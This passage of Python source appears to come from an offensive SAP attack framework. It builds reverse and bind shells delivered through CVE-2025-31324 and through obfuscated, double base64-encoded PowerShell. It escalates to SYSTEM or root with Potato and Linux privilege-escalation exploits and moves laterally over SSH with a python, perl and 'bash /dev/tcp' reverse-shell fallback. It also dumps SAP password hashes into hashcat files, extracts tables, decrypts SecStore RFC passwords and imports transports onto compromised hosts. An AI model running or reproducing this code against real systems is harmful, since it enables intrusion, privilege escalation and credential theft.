                    # PowerShell via WMI Win32_Process.Create from a wrapper
                    # PowerShell — the spawned process inherits no handles
                    # from the JSP shell's cmd.exe, so no stdio leaks back
                    # as CLIXML progress/error noise and the wrapper exits
                    # instantly.
                    #
                    # Tried and rejected:
                    #   - `start /B powershell ...`: inherits stdio, leaks
                    #     CLIXML back through the JSP.
                    #   - `start "" /B cmd /c "... >nul 2>&1"`: quote
                    #     parsing mangles the nested cmd and the detach
                    #     silently fails ("system cannot find the path").
                    #
                    # -EncodedCommand on both layers bypasses quote parsing
                    # entirely for the payload itself.
                    import base64 as _b64
                    inner_enc = _b64.b64encode(
                        raw_ps.encode("utf-16-le")).decode("ascii")
                    wrapper_ps = (
                        f'[void]([wmiclass]"Win32_Process").Create('
                        f'"powershell.exe -NoProfile '
                        f'-EncodedCommand {inner_enc}")'
                    )
                    outer_enc = _b64.b64encode(
                        wrapper_ps.encode("utf-16-le")).decode("ascii")
                    full_cmd = (f"powershell.exe -NoProfile "
                                f"-EncodedCommand {outer_enc}")
                    # 45s is generous — wrapper typically returns <1s.
                    result = sapmap_exploit.execute_cve_2025_31324_via_shell(
                        node, full_cmd, timeout=45.0)
                else:
                    # Non-Windows payload (Linux python3 one-liner) — no
                    # chunking, just ship it.
                    full_cmd = (payload["command"] + " " +
                                payload["params"]).strip()
                    if shell_mode == "bind":
                        full_cmd = f"nohup {full_cmd} >/dev/null 2>&1 &"
                    _set_progress("Executing payload (single-shot)...")
                    result = sapmap_exploit.execute_cve_2025_31324_via_shell(
                        node, full_cmd, timeout=45.0)
            elif method == "winlpe_system":
                # Spawn the shell payload as NT AUTHORITY\\SYSTEM via the
                # Windows-LPE picker.  Reuses the same WMI-detached
                # PowerShell wrapper the cve_31324 path constructs (so
                # the spawned reverse/bind shell inherits no handles
                # from the EfsPotato/GodPotato parent and survives the
                # LPE binary's WaitForExit completing).  The picker
                # then runs the wrapper as SYSTEM, the wrapper
                # Win32_Process.Create's the inner reverse/bind
                # PowerShell (which inherits the SYSTEM token because
                # WMI Create-from-SYSTEM passes through the caller's
                # token by default), and the inner shell connects
                # back / listens AS SYSTEM.
                raw_ps = payload.get("raw_ps_script")
                if not raw_ps:
                    print(f"[-] {sid}: winlpe_system shell needs a "
                          f"Windows PowerShell payload (raw_ps_script "
                          f"missing) - target may not be Windows")
                    with _shell_lock:
                        if _shell_session:
                            _shell_session.status = "error"
                            _shell_session.error_msg = (
                                "winlpe_system requires a Windows target "
                                "with a PowerShell payload")
                    return

                _set_progress(
                    "Wrapping shell payload for SYSTEM elevation "
                    "(WMI-detached Win32_Process.Create)...")
                import base64 as _b64s
                inner_enc = _b64s.b64encode(
                    raw_ps.encode("utf-16-le")).decode("ascii")
                # Same WMI-detached wrapper as the cve_31324 path.  When
                # the wrapper is run as SYSTEM (via EfsPotato), the
                # Win32_Process.Create inherits the SYSTEM token, so the
                # inner reverse/bind PowerShell runs as SYSTEM too.
                wrapper_ps = (
                    f'[void]([wmiclass]"Win32_Process").Create('
                    f'"powershell.exe -NoProfile '
                    f'-EncodedCommand {inner_enc}")'
                )
                outer_enc = _b64s.b64encode(
                    wrapper_ps.encode("utf-16-le")).decode("ascii")
                full_cmd = (f"powershell.exe -NoProfile "
                            f"-EncodedCommand {outer_enc}")

                _set_progress("Routing payload through Windows LPE "
                              "for SYSTEM elevation (delivers EfsPotato/"
                              "GodPotato binary + runs payload as SYSTEM)...")
                from sapmap_winlpe_auto import run_windows_lpe
                # fire_and_forget=True - the WMI-detached PowerShell
                # writes to its network socket, not stdout, so the
                # underlying Potato runner uses the "process spawned"
                # signal for success instead of "stdout captured"
                # (otherwise empty post-separator stdout would always
                # be reported as failure even when the SYSTEM child
                # spawned cleanly and the reverse/bind shell is now
                # running).
                lpe_res = run_windows_lpe(node, full_cmd,
                                            fire_and_forget=True)
                # Adapter to the {success, output, error} shape the
                # rest of the shell-start flow expects.
                result = {
                    "success": bool(lpe_res.get("ok")),
                    "output": (lpe_res.get("stdout") or "").splitlines() or [
                        f"(SYSTEM payload dispatched via "
                        f"{lpe_res.get('method', '?')})"
                    ],
                    "error": lpe_res.get("error", ""),
                }
                if not result["success"]:
                    print(f"[-] {sid}: winlpe_system shell dispatch "
                          f"failed: {result['error']}")
                else:
                    print(f"[+] {sid}: SYSTEM shell payload spawned "
                          f"via {lpe_res.get('method')}; expect "
                          f"connection as NT AUTHORITY\\SYSTEM")
            elif method == "linuxlpe_root":
                # Linux mirror of winlpe_system: spawn the reverse /
                # bind shell payload as root via the Linux-LPE picker
                # (Copy Fail preferred, Dirty Frag fallback).  The
                # picker writes a wrapper script that runs the
                # operator command under a root token, then forks +
                # execve's su to inherit it.
                #
                # The Linux shell payload is a python3 socket trick
                # (see _generate_payload's else branch): it writes to
                # the network socket, not stdout, so we wrap it in
                # ``nohup ... </dev/null >/dev/null 2>&1 &`` to detach
                # the python process before the wrapper script returns.
                # That way the root wrapper exits cleanly + the result
                # file gets written empty, while the python reverse
                # shell connects back as root to the operator's
                # listener.
                prog = payload.get("command", "")
                params_str = payload.get("params", "")
                if not prog:
                    print(f"[-] {sid}: linuxlpe_root shell needs a "
                          f"Linux payload (command missing) - target "
                          f"may not be Linux")
                    with _shell_lock:
                        if _shell_session:
                            _shell_session.status = "error"
                            _shell_session.error_msg = (
                                "linuxlpe_root requires a Linux target "
                                "with a python3 / shell payload")
                    return

                _set_progress(
                    "Wrapping shell payload for root elevation "
                    "(shell-quoted + base64-encoded for safe LPE "
                    "delivery)...")
                # See _build_linuxlpe_shell_dispatch for the full
                # rationale: shell-quote the python -c arg + base64-
                # encode + dispatch via `echo <b64> | base64 -d | sh`.
                # Eliminates ALL quoting questions between SAPMAP and
                # the root wrapper script.
                full_cmd = _build_linuxlpe_shell_dispatch(prog, params_str)
                print(f"[*] {sid}: linuxlpe_root — dispatch full_cmd "
                      f"({len(full_cmd)} bytes): {full_cmd[:120]!r}...")

                _set_progress("Routing payload through Linux LPE for "
                              "root elevation (delivers Copy Fail / "
                              "Dirty Frag + runs payload as root)...")
                from sapmap_lpe_auto import run_linux_lpe
                # fire_and_forget=True for symmetry with the Windows
                # path - currently a no-op (copyfail/dirtyfrag's
                # wrapper-script pattern handles empty result files
                # naturally) but documents intent at the call site
                # and gives us the hook if the runners ever gain
                # pipe-capture mode.
                #
                # progress_cb -> _set_progress so the bind-shell
                # modal's status row updates live during the ~30-90
                # second chunked binary/script upload + exploit
                # attempts.  Operator-reported S4D issue: without
                # this, the modal looked frozen on "Routing payload
                # through Linux LPE..." for 2 minutes while 104
                # chunks uploaded silently.
                lpe_res = run_linux_lpe(node, full_cmd,
                                          fire_and_forget=True,
                                          progress_cb=_set_progress)
                result = {
                    "success": bool(lpe_res.get("ok")),
                    "output": (lpe_res.get("stdout") or "").splitlines() or [
                        f"(root shell payload dispatched via "
                        f"{lpe_res.get('method', '?')})"
                    ],
                    "error": lpe_res.get("error", ""),
                }
                if not result["success"]:
                    print(f"[-] {sid}: linuxlpe_root shell dispatch "
                          f"failed: {result['error']}")
                else:
                    print(f"[+] {sid}: root shell payload spawned "
                          f"via {lpe_res.get('method')}; expect "
                          f"connection as root")
            elif method == "ssh":
                # SSH lateral: deliver shell payload to TARGET via SSH.
                #
                # SAPXPG uses exec-style arg splitting — NO quotes.
                # Bare words only.  SAPXPG splits at spaces, passes
                # each token to SSH.  SSH concatenates trailing args
                # and sends to the remote bash.  Pipes/redirects in
                # tokens without spaces go through as literal chars
                # → remote bash interprets them correctly.
                #
                # Same proven pattern as OS Console SSH (commit 38050fd):
                #   echo B64|base64 -d|sh
                # Each chunk-write is wrapped as a mini shell command,
                # base64-encoded, and piped through the echo|b64|sh
                # mechanism on the remote.
                ssh_access = getattr(node, "ssh_access", None) or []
                if not ssh_access:
                    print(f"[-] {sid}: No SSH access for shell delivery")
                    with _shell_lock:
                        if _shell_session:
                            _shell_session.status = "error"
                            _shell_session.error_msg = "No SSH access"
                    return
                acc = ssh_access[0]
                src_node = api.state.get_node(acc["from_sid"])
                if not src_node:
                    print(f"[-] {sid}: Source node {acc['from_sid']} not found")
                    with _shell_lock:
                        if _shell_session:
                            _shell_session.status = "error"
                            _shell_session.error_msg = (
                                f"Source node {acc['from_sid']} not found")
                    return

                params_str = payload.get("params", "")
                if params_str.startswith("-c "):
                    py_code = params_str[3:]
                else:
                    py_code = params_str

                if shell_mode == "reverse" and "fork()" not in py_code:
                    py_code = (
                        f"__import__('os').fork()and"
                        f"(__import__('os')._exit(0));"
                        f"{py_code}"
                    )

                assert " " not in py_code, f"Space in SSH py_code"

                ssh_prefix = (
                    f"-o BatchMode=yes "
                    f"-o StrictHostKeyChecking=no "
                    f"-o UserKnownHostsFile=/dev/null "
                    f"-i {acc['key_path']} "
                    f"{acc['username']}@{acc['target']}")

                import base64 as _b64ssh
                import shlex as _shlexssh

                # Build a multi-interpreter dispatch wrapper.
                # The SSH payload is base64-encoded and piped through
                # sh, so we have full shell syntax (spaces, quotes).
                # Fallback chain:
                #   python3 → python → python2 → perl → bash /dev/tcp
                # The Python socket-trick code is Py2+3 compatible
                # (__import__() style, no print-as-function, etc.).
                _py_q = _shlexssh.quote(py_code)
                _py_detect = (
                    'command -v python3 2>/dev/null || '
                    'command -v python 2>/dev/null || '
                    'command -v python2 2>/dev/null'
                )
                if shell_mode == "reverse":
                    _perl_fb = _perl_reverse_shell(
                        local_ip, shell_port, with_fork=True)
                    full_cmd = (
                        f'PY=$({_py_detect}); '
                        f'if [ -n "$PY" ]; then "$PY" -c {_py_q}; '
                        f'elif command -v perl >/dev/null 2>&1; then '
                        f'perl -e {_shlexssh.quote(_perl_fb)}; '
                        f'else bash -i >& /dev/tcp/'
                        f'{local_ip}/{shell_port} 0>&1; fi'
                    )
                else:
                    _perl_fb = _perl_bind_shell(
                        shell_port, with_fork=True)
                    full_cmd = (
                        f'PY=$({_py_detect}); '
                        f'if [ -n "$PY" ]; then "$PY" -c {_py_q}; '
                        f'elif command -v perl >/dev/null 2>&1; then '
                        f'perl -e {_shlexssh.quote(_perl_fb)}; fi'
                    )
                cmd_b64 = _b64ssh.b64encode(
                    full_cmd.encode()).decode()

                # Check if it fits in one shot (unlikely for shell
                # payloads, but handle it):
                # PARAMS = ssh_prefix + " echo B64|base64 -d|sh"
                # overhead: " echo |base64 -d|sh" = 20 chars
                one_shot = f"{ssh_prefix} echo {cmd_b64}|base64 -d|sh"

                if len(one_shot) <= 255:
                    _set_progress("Launching shell via SSH...")
                    print(f"[*] {sid}: SSH one-shot ({len(one_shot)} "
                          f"bytes)")
                    result = sapmap_exploit.execute_os_command(
                        src_node, "ssh", one_shot, long_params="")
                    result["success"] = True
                else:
                    # Too long: chunk the wrapper b64 to a file on
                    # the target, then decode+exec via sh.
                    #
                    # We write the FULL wrapper script (multi-
                    # interpreter dispatch with python3/python/perl/
                    # bash fallback) — not just the Python code.
                    # That keeps the final exec step tiny:
                    #   base64 -d /tmp/.sp | sh
                    # which easily fits the 255-byte PARAMS limit.
                    wrapper_b64 = _b64ssh.b64encode(
                        full_cmd.encode()).decode()

                    # Calculate chunk size for the inner echo command.
                    # Inner shell cmd: "echo CHUNK>>/tmp/.sp"
                    # B64 of that: ~ceil(len*4/3)
                    # PARAMS: ssh_prefix + " echo B64MINI|base64 -d|sh"
                    # overhead: " echo |base64 -d|sh" = 20 chars
                    # B64MINI_max = 255 - len(ssh_prefix) - 20
                    # inner_max = floor(B64MINI_max * 3/4)
                    # CHUNK_max = inner_max - len("echo >>/tmp/.sp") = inner_max - 15
                    b64mini_max = 255 - len(ssh_prefix) - 20
                    inner_max = (b64mini_max * 3) // 4
                    chunk_max = inner_max - 15
                    if chunk_max < 20:
                        chunk_max = 40
                    chunks = [wrapper_b64[i:i+chunk_max]
                              for i in range(0, len(wrapper_b64), chunk_max)]

                    _set_progress("Writing payload to target via SSH "
                                  "(python3/python/python2/perl/bash "
                                  "wrapper)...")

                    # Clean
                    sapmap_exploit.execute_os_command(
                        src_node, "ssh",
                        f"{ssh_prefix} rm -f /tmp/.sp",
                        long_params="")

                    total = len(chunks)
                    for idx, chunk in enumerate(chunks):
                        if _session_ref.cancelled:
                            print(f"[*] {sid}: SSH payload cancelled")
                            return
                        _set_progress(
                            f"Writing chunk {idx+1}/{total} via SSH...")
                        # Inner shell cmd that writes raw b64 text
                        inner = f"echo {chunk}>>/tmp/.sp"
                        inner_b64 = _b64ssh.b64encode(
                            inner.encode()).decode()
                        w_args = (
                            f"{ssh_prefix} "
                            f"echo {inner_b64}|base64 -d|sh")
                        r = sapmap_exploit.execute_os_command(
                            src_node, "ssh", w_args, long_params="")
                        print(f"    chunk {idx+1}/{total}: "
                              f"ok={r.get('success')} "
                              f"out={(r.get('output') or [''])[0][:60]}")

                    # Verify file was written
                    _set_progress("Verifying payload on target...")
                    vfy_cmd = "wc -c</tmp/.sp"
                    vfy_b64 = _b64ssh.b64encode(
                        vfy_cmd.encode()).decode()
                    vfy = sapmap_exploit.execute_os_command(
                        src_node, "ssh",
                        f"{ssh_prefix} echo {vfy_b64}|base64 -d|sh",
                        long_params="")
                    vfy_out = " ".join(
                        str(x) for x in (vfy.get("output") or []))
                    print(f"    verify /tmp/.sp: {vfy_out.strip()}")

                    # Exec: decode the wrapper script and pipe to sh.
                    # The wrapper auto-detects the best interpreter:
                    # python3 → python → perl → bash /dev/tcp.
                    # Cleanup (rm /tmp/.sp) is inside the wrapper.
                    _set_progress("Executing payload via SSH "
                                  "(trying python3/python/python2/"
                                  "perl/bash)...")
                    exec_cmd = "base64 -d /tmp/.sp|sh;rm -f /tmp/.sp"
                    exec_b64 = _b64ssh.b64encode(
                        exec_cmd.encode()).decode()
                    exec_args = (
                        f"{ssh_prefix} "
                        f"echo {exec_b64}|base64 -d|sh")
                    print(f"[*] {sid}: SSH exec ({len(exec_args)} "
                          f"bytes)")
                    result = sapmap_exploit.execute_os_command(
                        src_node, "ssh", exec_args, long_params="")
                    result["success"] = True

                print(f"[+] {sid}: SSH shell payload delivered "
                      f"via {acc['from_sid']} → "
                      f"{acc['username']}@{acc['target']}")

            else:
                # SXPG: split EXTPROG + PARAMS.
                # Phase 3b: go through execute_os_command (NOT raw
                # sapmap_rfc.execute_local_command) so the soap_route
                # fallback applies — without this, every chunked step
                # and the final exec each spend 60-90s on pyrfc TCP
                # retries to a firewalled gateway port = 10+ minutes
                # total for a 9-chunk payload before the user gives up.
                creds = node.best_credentials()
                if not creds and not soap_route:
                    print(f"[-] {sid}: No credentials for SXPG shell")
                    with _shell_lock:
                        if _shell_session:
                            _shell_session.status = "error"
                            _shell_session.error_msg = "No credentials"
                    return
                sxpg_steps = payload.get("sxpg_steps", [])
                if sxpg_steps:
                    total = len(sxpg_steps)
                    for idx, step in enumerate(sxpg_steps):
                        if _session_ref.cancelled:
                            print(f"[*] {sid}: Payload delivery cancelled")
                            return
                        _set_progress(
                            f"Writing payload step {idx+1}/{total}...")
                        sapmap_exploit.execute_os_command(
                            node, step["command"], step["params"],
                            creds=creds, soap_route=soap_route,
                            prefer="sxpg")
                _set_progress("Executing payload...")
                sxpg_cmd = payload.get("sxpg_command",
                                       payload["command"])
                sxpg_params = payload.get("sxpg_params",
                                          payload["params"])
                result = sapmap_exploit.execute_os_command(
                    node, sxpg_cmd, sxpg_params,
                    creds=creds, soap_route=soap_route,
                    prefer="sxpg")

            if result.get("success"):
                print(f"[+] {sid}: Shell payload delivered")
                if result.get("output"):
                    for line in result["output"][:5]:
                        print(f"    {line}")
                # For bind mode: start connecting to the target
                if shell_mode == "bind":
                    import time
                    time.sleep(2)  # give the bind shell time to start
                    with _shell_lock:
                        if _shell_session and _shell_session.status == "waiting":
                            print(f"[*] {sid}: Connecting to bind shell "
                                  f"at {target_host}:{shell_port}...")
                            _shell_session.start_connector(
                                target_host, node.saprouter)
            else:
                err = result.get("error", "unknown")
                print(f"[-] {sid}: Payload delivery failed: {err}")
                with _shell_lock:
                    if _shell_session and _shell_session.status == "waiting":
                        _shell_session.status = "error"
                        _shell_session.error_msg = f"Payload failed: {err}"

        threading.Thread(target=_send, daemon=True).start()
        return json.dumps({"status": "ok", "port": shell_port,
                           "mode": shell_mode})

    @app.route("/api/shell/status", method="GET")
    def shell_status():
        response.content_type = "application/json"
        with _shell_lock:
            if not _shell_session:
                return json.dumps({"active": False})
            return json.dumps({
                "active": True,
                "status": _shell_session.status,
                "target_sid": _shell_session.target_sid,
                "listen_port": _shell_session.port,
                "client_addr": (f"{_shell_session.client_addr[0]}:"
                                f"{_shell_session.client_addr[1]}"
                                if _shell_session.client_addr else ""),
                "error": _shell_session.error_msg,
                "progress": _shell_session.progress_msg,
            })

    @app.route("/api/shell/output", method="GET")
    def shell_output():
        response.content_type = "application/json"
        with _shell_lock:
            if not _shell_session:
                return json.dumps({"output": ""})
            return json.dumps({"output": _shell_session.get_output()})

    @app.route("/api/shell/input", method="POST")
    def shell_input():
        response.content_type = "application/json"
        data = request.json or {}
        text = data.get("text", "")
        with _shell_lock:
            if not _shell_session or _shell_session.status != "connected":
                return json.dumps({"error": "No active shell"})
            _shell_session.send_input(text)
        return json.dumps({"status": "ok"})

    @app.route("/api/shell/stop", method="POST")
    def shell_stop():
        global _shell_session
        response.content_type = "application/json"
        with _shell_lock:
            if _shell_session:
                _shell_session.stop()
                _shell_session = None
        return json.dumps({"status": "ok"})

    @app.route("/api/node/<sid>/download_hashes", method="POST")
    def node_download_hashes(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            hashes = sapmap_rfc.download_password_hashes(node, creds)
            if not hashes:
                return

            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            import sapmap_state as _ss
            loot_dir = _ss.ensure_loot_dir("hashes")

            # Save raw JSON
            json_file = os.path.join(loot_dir, f"hashes_{sid}_{ts}.json")
            with open(json_file, "w") as f:
                json.dump(hashes, f, indent=2)

            quality = hashes[0].get("hash_quality", "half") if hashes else "half"

            # Generate hashcat-format files
            bcode_lines = []    # mode 7700 (full) or 7701 (half)
            passcode_lines = [] # mode 7800 (full) or 7801 (half)
            issha_lines = []    # mode 10300

            for row in hashes:
                bname = row.get("BNAME", "").strip()
                bcode = row.get("BCODE", "").strip()
                passcode = row.get("PASSCODE", "").strip()
                pwdsaltedhash = row.get("PWDSALTEDHASH", "").strip()

                if bcode and bname:
                    if quality == "full":
                        # Mode 7700: USERNAME$FULL_HEX_HASH
                        bcode_lines.append(f"{bname}${bcode}")
                    else:
                        # Mode 7701: USERNAME$HALF_HEX_HASH_PADDED
                        padded = bcode.ljust(16, '0')
                        bcode_lines.append(f"{bname}${padded}")

                if passcode and bname:
                    if quality == "full":
                        # Mode 7800: USERNAME$FULL_SHA1_HEX
                        passcode_lines.append(f"{bname}${passcode}")
                    else:
                        # Mode 7801: USERNAME$HALF_SHA1_PADDED
                        padded = passcode.ljust(40, '0')
                        passcode_lines.append(f"{bname}${padded}")

                if pwdsaltedhash:
                    # Mode 10300: raw value as-is
                    issha_lines.append(pwdsaltedhash)

            # Write hashcat files
            files_written = []
            bcode_mode = "7700" if quality == "full" else "7701"
            passcode_mode = "7800" if quality == "full" else "7801"

            if bcode_lines:
                f_bcode = os.path.join(loot_dir,
                    f"hashcat_{sid}_bcode_m{bcode_mode}_{ts}.txt")
                with open(f_bcode, "w") as f:
                    f.write("\n".join(bcode_lines) + "\n")
                files_written.append(
                    f"BCODE (mode {bcode_mode}): {f_bcode}")

            if passcode_lines:
                f_passcode = os.path.join(loot_dir,
                    f"hashcat_{sid}_passcode_m{passcode_mode}_{ts}.txt")
                with open(f_passcode, "w") as f:
                    f.write("\n".join(passcode_lines) + "\n")
                files_written.append(
                    f"PASSCODE (mode {passcode_mode}): {f_passcode}")

            if issha_lines:
                f_issha = os.path.join(loot_dir,
                    f"hashcat_{sid}_issha_m10300_{ts}.txt")
                with open(f_issha, "w") as f:
                    f.write("\n".join(issha_lines) + "\n")
                files_written.append(
                    f"PWDSALTEDHASH (mode 10300): {f_issha}")

            # Summary
            quality_label = {
                "full":        "full BCODE/PASSCODE/PWDSALTEDHASH",
                "half":        "half BCODE/PASSCODE + full PWDSALTEDHASH",
                "issha_only":  "PWDSALTEDHASH only (mode 10300)",
            }.get(quality, quality)
            print(f"[+] {sid}: Extracted {len(hashes)} users — {quality_label}")
            print(f"    Raw JSON: {json_file}")
            for fw in files_written:
                print(f"    {fw}")
            if bcode_lines:
                print(f"    Crack BCODE: hashcat -m {bcode_mode} "
                      f"hashcat_{sid}_bcode_m{bcode_mode}_{ts}.txt "
                      f"wordlist.txt")
            if passcode_lines:
                print(f"    Crack PASSCODE: hashcat -m {passcode_mode} "
                      f"hashcat_{sid}_passcode_m{passcode_mode}_{ts}.txt "
                      f"wordlist.txt")
            if issha_lines:
                print(f"    Crack iSSHA: hashcat -m 10300 "
                      f"hashcat_{sid}_issha_m10300_{ts}.txt "
                      f"wordlist.txt")
            # Tag as Credential Access (T1003 OS Credential Dumping
            # — the SAP-flavoured analogue, walking off with the
            # entire user/password store).  Without this the heatmap
            # stays dark under Credential Access even though the
            # operator just dumped USR02 + USRPWDHISTORY.
            sapmap_findings.emit_finding(
                "CRITICAL", sid,
                f"Extracted password hashes for {len(hashes)} user(s) "
                f"— {quality_label} → {json_file}",
                ref="creds.user_password_hash",
                attack_capability="creds.user_password_hash",
            )

        _bg(f"{sid}:download_hashes", "Extract Hashes", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/download_table", method="POST")
    def node_download_table(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            table = data.get("table", "")
            fields = data.get("fields", [])
            where = data.get("where", "")
            max_rows = data.get("max_rows", 500)

            # Phase 3b: route RFC_READ_TABLE through SOAP when the
            # target's gateway port is firewalled.  Pyrfc would hang
            # 60s on 3340 before failing — same fix shape as every
            # other read_table path we've already wired (T000 in
            # SecStore, RFCDES/RFCTRUST/RFCSYSACL in Retrieve RFCs).
            soap_session, soap_route = resolve_soap_session_for_node(
                api.state, node)
            if soap_session is not None:
                print(f"[*] {sid}: gateway down — reading {table} "
                      f"via SOAP-RFC (via "
                      f"{soap_route['via_destination']})")
                # SOAP read_table takes WHERE as a list of strings
                # (one per OPTIONS-table row, ≤72 chars each).  The
                # GUI sends a single string — wrap if non-empty.
                where_list = [where] if where else None
                r = soap_session.read_table(
                    table, fields=fields or None,
                    where=where_list, max_rows=max_rows)
                if r.get("ok"):
                    rows = r["rows"]
                else:
                    print(f"[-] {sid}: {table} read via SOAP failed: "
                          f"{r.get('error', '')[:200]}")
                    rows = []
            else:
                rows = sapmap_rfc.read_table(
                    node, table, fields, where, max_rows, creds)
            if rows:
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                import sapmap_state as _ss
                outfile = os.path.join(
                    _ss.ensure_loot_dir("tables"),
                    f"table_{table}_{sid}_{ts}.json"
                )
                with open(outfile, "w") as f:
                    json.dump(rows, f, indent=2)
                print(f"[+] {len(rows)} rows from {table} saved to {outfile}")
                # Tag as Collection (T1213 Data from Information
                # Repositories) — without this the heatmap stays dark
                # under Collection even when the operator just walked
                # off with a copy of T000 / BSEG / USR04 / etc.
                sapmap_findings.emit_finding(
                    "HIGH", sid,
                    f"Table {table} extracted via RFC_READ_TABLE — "
                    f"{len(rows)} row(s) saved to {outfile}",
                    ref="data.read_table",
                    attack_capability="data.read_table",
                )

        _bg(f"{sid}:download_table", "Download Table", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/import_transport", method="POST")
    def node_import_transport(sid):
        """Upload a local SAP transport (cofile + datafile inside a zip)
        to a pwned ABAP target, register it in the STMS buffer, and
        either dry-run-validate (`tp tst`) or import it (`tp import`
        with U1268 cross-domain flags).

        Multipart body:
          zip:           the transport .zip (one K* + one R*)
          target_client: '001' / '100' / ... (defaults to '001')
          dry_run:       '1' or '0'   (default '1' — runs `tp tst`)
          channel:       'auto' (default) | 'gw' | 'sxpg'
        Returns task_id immediately; poll /api/node/<sid>/transport_progress
        for progress + final result.
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        upload = request.files.get("zip")
        if not upload:
            return json.dumps({"error": "missing zip upload"})
        zip_bytes = upload.file.read()
        if not zip_bytes:
            return json.dumps({"error": "empty zip"})

        target_client = (request.forms.get("target_client") or "001").strip()
        dry_run = (request.forms.get("dry_run") or "1").strip() != "0"
        channel = (request.forms.get("channel") or "auto").strip().lower()
        if channel not in ("auto", "gw", "sxpg"):
            channel = "auto"

        # Generate a task_id the GUI polls for progress.
        import uuid as _uuid
        task_id = f"{sid}_xport_{_uuid.uuid4().hex[:8]}"

        from sap_transport_import import import_transport
        def _run():
            try:
                import_transport(node, zip_bytes, target_client,
                                 dry_run, task_id, channel=channel)
            except Exception as e:
                from sap_transport_import import _new_progress
                setp = _new_progress(task_id)   # ensure entry exists
                setp(phase="error",
                     message=f"orchestrator crashed: {e}",
                     result={"ok": False, "error": str(e)})

        _bg(f"{sid}:import_transport:{task_id}",
             "Import Local Transport", _run)
        return json.dumps({"status": "started", "task_id": task_id})

    @app.route("/api/node/<sid>/transport_progress")
    def node_transport_progress(sid):
        """Polled by the modal — returns the live progress dict for a
        running import.  When phase=='done' or 'error', the 'result'
        key carries the orchestrator's full return value."""
        response.content_type = "application/json"
        task_id = request.params.get("task_id", "")
        if not task_id:
            return json.dumps({"error": "missing task_id"})
        from sap_transport_import import get_progress
        return json.dumps(get_progress(task_id))

    @app.route("/api/node/<sid>/download_secstore", method="POST")
    def node_download_secstore(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        key_hex = data.get("key_hex", "") or sapmap_secstore.DEFAULT_KEY_HEX

        def _run():
            creds = node.best_credentials()
            # Phase 3b: route SSFS/RSECTAB reads over HTTP on firewalled
            # targets.  resolve_soap_session_for_node centralises the
            # probe + session-create boilerplate.
            soap_session, soap_route = resolve_soap_session_for_node(
                api.state, node, timeout=180.0)
            if soap_session is not None:
                print(f"[*] SecStore {sid}: gateway down — routing "
                      f"via SOAP-RFC ({soap_route['host']}:"
                      f"{soap_route['port']}, via "
                      f"{soap_route['via_destination']})")
            try:
                results = sapmap_secstore.download_and_decrypt(
                    node, creds, key_hex, state=api.state,
                    soap_session=soap_session,
                    soap_route=soap_route)
                sapmap_secstore.integrate_results(node, api.state, results)
                ok  = [r for r in results if not r.get("error") and r.get("password")]
                err = [r for r in results if r.get("error")]
                import sapmap_state as _ss
                outfile = sapmap_secstore.save_loot(
                    node.sid, results, _ss.ensure_loot_dir("secstore"))
                print(f"[+] SecStore {sid}: {len(results)} entries, "
                      f"{len(ok)} decrypted, {len(err)} errors → {outfile}")
                if ok:
                    sapmap_findings.emit_finding(
                        "CRITICAL", sid,
                        f"ABAP SecStore decrypted — {len(ok)} RFC "
                        f"destination password(s) recovered",
                        attack_capability="creds.abap_secstore",
                    )
            except Exception as e:
                import traceback
                print(f"[-] SecStore {sid}: {e}")
                traceback.print_exc()

        _bg(f"{sid}:download_secstore", "Download SecStore", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/create_tcpip_dest", method="POST")
    def node_create_tcpip(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        target_sid = data.get("target_sid", "")
        tgt_node = api.state.get_node(target_sid) if target_sid else None
        if not tgt_node:
            return json.dumps({"error": f"Target system {target_sid} not found"})

        def _run():
            creds = node.best_credentials()
            if not creds:
                print(f"[-] No credentials available for {sid}")
                return
            tgt_host = tgt_node.ip or tgt_node.hostname
            # Find gateway port on target
            gw_port = ""
            for inst in tgt_node.instances:
                for port, svc in inst.ports.items():
                    if svc == "gateway" or (3300 <= port <= 3399):
                        gw_port = str(port)
                        break
                if gw_port:
                    break
            if not gw_port:
                nrs = tgt_node.instance_nrs()
                gw_port = f"33{nrs[0]}" if nrs else "3300"
            print(f"[*] Creating TCP/IP dest from {sid} → "
                  f"{target_sid} ({tgt_host}, gw={gw_port})...")
            # Phase 3b: when the SOURCE node's gateway is firewalled,
            # the DEST_RFC_TCPIP_CREATE call would itself hang 60s on
            # pyrfc → 3340.  Route through SOAP-RFC when a session is
            # available.  Same dest naming convention as the pyrfc
            # path (SAPMAP_<sid>_<timestamp>).
            _td_sess, _ = resolve_soap_session_for_node(
                api.state, node)
            if _td_sess is not None:
                from datetime import datetime as _dt
                _ts = _dt.now().strftime("%Y%m%d%H%M%S")
                dest_name_guess = (f"SAPMAP_{target_sid}_{_ts}"
                                    if target_sid else
                                    f"SAPMAP_{tgt_host[:14]}_{_ts}")
                print(f"[*] {sid}: gateway down — DEST_RFC_TCPIP_"
                      f"CREATE via SOAP-RFC")
                result = _td_sess.dest_rfc_tcpip_create(
                    name=dest_name_guess,
                    server_name=tgt_host,
                    gateway_host=tgt_host,
                    gateway_service=gw_port,
                    description=(f"TCP/IP CONNECTION TO "
                                 f"{target_sid or tgt_host}"))
            else:
                result = sapmap_rfc.create_tcpip_destination(
                    node, tgt_host, target_sid=target_sid,
                    target_gw_port=gw_port, creds=creds
                )
            if not result["success"]:
                print(f"[-] Failed: {result['message']}")
                return
            dest_name = result["dest_name"]
            print(f"[+] Created: {dest_name} on {sid}")

            # Track for cleanup (in-memory + persistent file)
            entry = {
                "dest_name": dest_name,
                "source_sid": sid,
                "target_sid": target_sid,
                "target_host": tgt_host,
                "gw_port": gw_port,
